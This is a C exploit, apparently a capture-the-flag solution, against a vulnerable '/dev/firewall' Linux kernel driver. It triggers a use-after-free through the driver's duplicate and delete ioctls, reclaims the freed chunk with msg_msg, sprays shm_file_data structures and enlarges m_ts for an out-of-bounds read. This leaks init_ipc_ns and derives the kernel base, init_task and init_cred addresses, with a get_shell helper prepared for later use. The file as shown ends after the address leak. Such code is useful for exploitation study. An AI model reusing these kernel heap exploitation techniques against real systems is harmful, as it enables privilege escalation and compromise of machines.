// author: @eastXueLian
// usage : musl-gcc ./exp.c -static -masm=intel -o ./rootfs/exp

#define _GNU_SOURCE
#include <fcntl.h>
#include <linux/userfaultfd.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#define COLOR_RED "\033[31m"
#define COLOR_GREEN "\033[32m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_BLUE "\033[34m"
#define COLOR_MAGENTA "\033[35m"
#define COLOR_CYAN "\033[36m"
#define COLOR_RESET "\033[0m"
#define lg(X) printf(COLOR_BLUE "[*] %s --> 0x%lx \033[0m\n", (#X), (X))
#define success(X) printf(COLOR_GREEN "[*] %s --> 0x%lx \033[0m\n", (#X), (X))
#define errExit(X)                                                             \
  printf(COLOR_RED "[*] %s \033[0m\n", (X));                                   \
  exit(0)

#define ADD_RULE 0x1337babe
#define DELETE_RULE 0xdeadbabe
#define EDIT_RULE 0x1337beef
#define SHOW_RULE 0xdeadbeef
#define DUP_RULE 0xbaad5aad

#define INBOUND 0
#define OUTBOUND 1
#define DESC_MAX 0x800

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status() {
  __asm__("mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;");
  puts("[*]status has been saved.");
}
void get_shell(void) { system("/bin/sh"); }

typedef struct {
  char iface[16];
  char name[16];
  char ip[16];
  char netmask[16];
  uint8_t idx;
  uint8_t type;
  uint16_t proto;
  uint16_t port;
  uint8_t action;
  char desc[DESC_MAX];
} user_rule_t;

typedef struct {
  long mtype;
  char mtext[1];
} msg;

typedef struct {
  void *ll_next;
  void *ll_prev;
  long m_type;
  size_t m_ts;
  void *next;
  void *security;
} msg_header;

int fd;
uint32_t target_idx;
uint64_t target_addr;
uint32_t target_size;
uint64_t race_page;
pthread_t thread;

uint64_t init_ipc_ns, kbase, init_task, init_cred;

void gen_dot_notation(char *buf, uint32_t val) {
  sprintf(buf, "%d.%d.%d.%d", val & 0xff, (val & 0xff00) >> 8,
          (val & 0xff0000) >> 16, (val & 0xff000000) >> 24);
  return;
}

void generate(char *input, user_rule_t *req) {
  char addr[0x10];
  uint32_t ip = *(uint32_t *)&input[0x20]; // remain improved
  uint32_t netmask = *(int32_t *)&input[0x24];

  memset(addr, 0, sizeof(addr));
  gen_dot_notation(addr, ip);
  memcpy((void *)req->ip, addr, 0x10);

  memset(addr, 0, sizeof(addr));
  gen_dot_notation(addr, netmask);
  memcpy((void *)req->netmask, addr, 0x10);

  memcpy((void *)req->iface, input, 0x10);
  memcpy((void *)req->name, (void *)&input[0x10], 0x10);
  memcpy((void *)&req->proto, (void *)&input[0x28], 0x2);
  memcpy((void *)&req->port, (void *)&input[0x28 + 2], 0x2);
  memcpy((void *)&req->action, (void *)&input[0x28 + 4], 0x1);
}

void add(uint8_t idx, char *buffer, int type) {
  user_rule_t rule;
  memset((void *)&rule, 0, sizeof(user_rule_t));
  generate(buffer, &rule);
  rule.idx = idx;
  rule.type = type;
  ioctl(fd, ADD_RULE, &rule);
}

void delete (uint8_t idx, int type) {
  user_rule_t rule;
  memset((void *)&rule, 0, sizeof(user_rule_t));
  rule.idx = idx;
  rule.type = type;
  ioctl(fd, DELETE_RULE, &rule);
}

void edit(uint8_t idx, char *buffer, int type, int invalidate) {
  user_rule_t rule;
  memset((void *)&rule, 0, sizeof(user_rule_t));
  generate(buffer, &rule);
  rule.idx = idx;
  rule.type = type;
  if (invalidate) {
    strcpy((void *)&rule.ip, "invalid");
    strcpy((void *)&rule.netmask, "invalid");
  }
  ioctl(fd, EDIT_RULE, &rule);
}

void duplicate(uint8_t idx, int type) {
  user_rule_t rule;
  memset((void *)&rule, 0, sizeof(user_rule_t));
  rule.idx = idx;
  rule.type = type;
  ioctl(fd, DUP_RULE, &rule);
}

int main() {
  cpu_set_t cpu_set;

  CPU_ZERO(&cpu_set);
  CPU_SET(0, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

  fd = open("/dev/firewall", O_RDONLY);
  char buffer[0x2000], received[0x2000];
  memset(buffer, 0, sizeof(buffer));
  memset(received, 0, sizeof(received));
  msg *message = (msg *)buffer;
  int qid, size;

  memset(buffer, 0x41, 0x40);
  for (int i = 0x50; i < 0x54; i++)
    add(i, buffer, INBOUND); // rule 0x50 - 0x54
  add(0, buffer, INBOUND);   // rule 0
  duplicate(0, INBOUND);
  qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

  // 1. leak kbase
  // 1-1. OOB read leak setup: construct UAF kmalloc-4096
  size = 0x1010;
  message->mtype = 1;
  memset(message->mtext, 0x41, size);
  delete (0, INBOUND); // trigger UAF
                       // 1-2. use msg_msg to take up the freed chunk
  msgsnd(qid, message, size - 0x30, 0); // kmalloc-4096 + kmalloc-32
  // 1-3. spray shm_file_data struct after msg_msgseg
  int shmid;
  char *shmaddr;
  for (int i = 0; i < 0x50; i++) {
    if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1) {
      perror("shmget error");
      exit(-1);
    }
    shmaddr = shmat(shmid, NULL, 0);
    if (shmaddr == (void *)-1) {
      perror("shmat error");
      exit(-1);
    }
  }
  // 1-4. change msg_msg->m_ts bigger
  msg_header evil;
  size = 0x1400;
  memset((void *)&evil, 0, sizeof(msg_header));
  evil.ll_next = (void *)0x4141414141414141;
  evil.ll_prev = (void *)0x4242424242424242;
  evil.m_type = 1;
  evil.m_ts = size; // 0x1010 -> 0x1400 : OOB read
  memset(buffer, 0, sizeof(buffer));
  memcpy(buffer, &evil, 0x20);
  edit(0, buffer, OUTBOUND, 1);
  // 1-5. leak shm_file_data->ns
  msgrcv(qid, received, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
  for (int i = 0; i < size / 8; i++) {
    if ((*(uint64_t *)(received + i * 8) & 0xfff) == 0x7a0) {
      printf("[+] init_ipc_ns offset at %d\n", i * 8);
      init_ipc_ns = *(uint64_t *)(received + i * 8);
      break;
    }
  }
  kbase = init_ipc_ns - (0xffffffff81c3d7a0 - 0xffffffff81000000);
  init_task = kbase + (0xffffffff81c124c0 - 0xffffffff81000000);
  init_cred = kbase + (0xffffffff81c33060 - 0xffffffff81000000);
  printf("[+] init_ipc_ns: 0x%lx\n", init_ipc_ns);
  printf("[+] kbase: 0x%lx\n", kbase);
  printf("[+] init_task: 0x%lx\n", init_task);
  printf("[+] init_cred: 0x%lx\n", init_cred);

  return 0;
}
